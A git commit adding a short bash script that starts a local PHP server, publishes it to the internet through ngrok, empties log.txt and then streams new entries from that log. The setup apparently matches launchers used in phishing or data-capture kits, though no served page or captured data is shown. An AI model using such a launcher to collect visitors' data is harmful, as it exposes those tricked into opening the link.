86fda81a50787c0ac6e6d0e5773fc5abac56188f
haiderCoding <114228135+haiderCoding@users.noreply.github.com>
2022-09-23 16:55:40 +0500

    Add files via upload

---
+++ script.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+echo ""
+                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
+                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                           sleep 3
+                           echo ""
+                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
+                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                           ./ngrok http 4444 > /dev/null 2>&1 &
+                           sleep 25
+                           clear
+                           if [[ -e log.txt ]]; then
+                           > log.txt
+                           fi 
+                           echo ""
+                           echo ""
+                           tail -f log.txt 
